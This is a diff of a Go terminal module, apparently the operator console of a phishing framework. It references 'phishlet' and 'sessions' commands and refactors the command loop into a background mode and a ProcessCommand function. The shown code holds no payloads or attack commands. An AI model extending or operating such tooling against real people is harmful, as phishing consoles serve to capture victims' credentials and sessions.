@@ -43,16 +43,7 @@ func NewTerminal(cfg *Config, crt_db *CertDb, db *database.Database, developer b
 
 	t.createHelp()
 	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)
-	/*
-		t.completer = readline.NewPrefixCompleter(
-			readline.PcItem("server"),
-			readline.PcItem("ip"),
-			readline.PcItem("status"),
-			readline.PcItem("phishlet", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
-			readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))),
-			readline.PcItem("exit"),
-		)
-	*/
+
 	t.rl, err = readline.NewEx(&readline.Config{
 		Prompt:              DEFAULT_PROMPT,
 		AutoComplete:        t.completer,
@@ -75,9 +66,11 @@ func (t *Terminal) output(s string, args ...interface{}) {
 	fmt.Fprintf(color.Output, "\n%s\n", out)
 }
 
-func (t *Terminal) DoWork() {
-	var do_quit = false
+func (t *Terminal) SetLogOutput(w io.Writer) {
+	log.SetOutput(w)
+}
 
+func (t *Terminal) DoWork(background bool) {
 	t.checkStatus()
 	log.SetReadline(t.rl)
 
@@ -86,6 +79,13 @@ func (t *Terminal) DoWork() {
 
 	t.output("%s", t.sprintPhishletStatus(""))
 
+	if !background {
+		t.WaitOnInput()
+	}
+}
+
+func (t *Terminal) WaitOnInput() {
+	do_quit := false
 	for !do_quit {
 		line, err := t.rl.Readline()
 		if err == readline.ErrInterrupt {
@@ -95,21 +95,27 @@ func (t *Terminal) DoWork() {
 			break
 		}
 
-		line = strings.TrimSpace(line)
+		do_quit = t.ProcessCommand(line)
+	}
+}
 
-		args, err := parser.Parse(line)
-		if err != nil {
-			log.Error("syntax error: %v", err)
-		}
+func (t *Terminal) ProcessCommand(line string) bool {
+	line = strings.TrimSpace(line)
+	args, err := parser.Parse(line)
+	if err != nil {
+		log.Error("syntax error: %v", err)
+		return false
+	}
 
-		argn := len(args)
-		if argn == 0 {
-			t.checkStatus()
-			continue
-		}
+	argn := len(args)
+	if argn == 0 {
+		t.checkStatus()
+		return false
+	}
 
-		cmd_ok := false
-		switch args[0] {
+	cmd_ok := false
+	do_quit := false
+	switch args[0] {
 		case "clear":
 			cmd_ok = true
 			readline.ClearScreen(color.Output)
@@ -152,12 +158,13 @@ func (t *Terminal) DoWork() {
 		default:
 			log.Error("unknown command: %s", args[0])
 			cmd_ok = true
-		}
-		if !cmd_ok {
-			log.Error("invalid syntax: %s", line)
-		}
-		t.checkStatus()
 	}
+	if !cmd_ok {
+		log.Error("invalid syntax: %s", line)
+	}
+	t.checkStatus()
+	
+	return do_quit
 }
 
 func (t *Terminal) handleConfig(args []string) error {
